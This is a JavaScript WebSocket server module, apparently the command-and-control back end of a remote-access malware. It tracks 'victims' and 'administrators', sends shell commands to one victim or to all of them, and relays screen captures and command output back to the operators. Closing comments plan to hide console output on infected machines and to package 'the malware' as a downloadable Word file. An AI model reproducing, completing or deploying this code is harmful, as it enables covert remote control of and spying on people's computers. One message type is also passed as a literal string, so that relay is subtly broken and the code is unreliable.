const { enviarMensajeAAdministradores, convertirCadenaAMapa, enviarMensajeAVictimas } = require('../utils/helpers');

let victimas = {};
let administradores = {};
let contadorClientes = 1;
let dataVictimas = {};

function manejarConexionesWebSocket(ws) {
    let clienteId = contadorClientes++;
    console.log(`Cliente ${clienteId} conectado.`);

    ws.on('message', (mensaje) => {
        try {
            const mensajeParseado = JSON.parse(mensaje);
            console.log(`Mensaje recibido del cliente ${clienteId}:`, mensajeParseado);

            if (mensajeParseado.tipo === 'ADMINISTRADOR') {
                administradores[clienteId] = ws;
                console.log(`Administrador ${clienteId} añadido.`);
                enviarMensajeAAdministradores(administradores, 'LISTA', dataVictimas);

            } else if (mensajeParseado.tipo === 'VICTIMA') {
                const datosConvertidos = convertirCadenaAMapa(mensajeParseado.cuerpo);
                victimas[clienteId] = ws;
                dataVictimas[clienteId] = { datos: datosConvertidos };

                console.log("data:", dataVictimas)
                enviarMensajeAAdministradores(administradores, 'LISTA', dataVictimas);

            } else if (mensajeParseado.tipo === "RESPUESTA") {
                console.log('Respuesta recibida:', mensajeParseado.cuerpo);
                enviarMensajeAAdministradores(administradores, 'RESPUESTACOMANDO', mensajeParseado.cuerpo);

            } else if (mensajeParseado.tipo === "CAPTURA" || mensajeParseado.tipo === "RESPUESTA-GET" || mensajeParseado.tipo === "RESPUESTA-SET") {
                enviarMensajeAAdministradores(administradores, mensajeParseado.tipo, mensajeParseado.cuerpo);
            } else if (mensajeParseado.tipo === 'COMANDO') {
                const cliente = victimas[mensajeParseado.id];
                if (cliente && cliente.readyState === ws.OPEN) {
                    console.log(`Enviando comando a la víctima ${mensajeParseado.id}: ${mensajeParseado.cuerpo}`);
                    cliente.send(JSON.stringify({ tipo: 'COMANDO', comando: mensajeParseado.cuerpo }));
                }
            } else if (mensajeParseado.tipo === 'COMANDOMASIVO') {
                enviarMensajeAVictimas(victimas, 'mensajeParseado.tipo', mensajeParseado.cuerpo)
            }


        } catch (error) {
            console.error(`Error al procesar mensaje del cliente ${clienteId}:`, error);
        }
    });

    ws.on('close', () => {
        console.log(`Cliente ${clienteId} desconectado.`);
        delete victimas[clienteId];
        delete administradores[clienteId];
        delete dataVictimas[clienteId];
        enviarMensajeAAdministradores(administradores, 'LISTA', dataVictimas);
    });
}

module.exports = {
    manejarConexionesWebSocket,
};



//ver archivo del servidor carpeta
// ocultar mensaje impresos e consola del clietne.
//crear un archivo word para descargar. el malware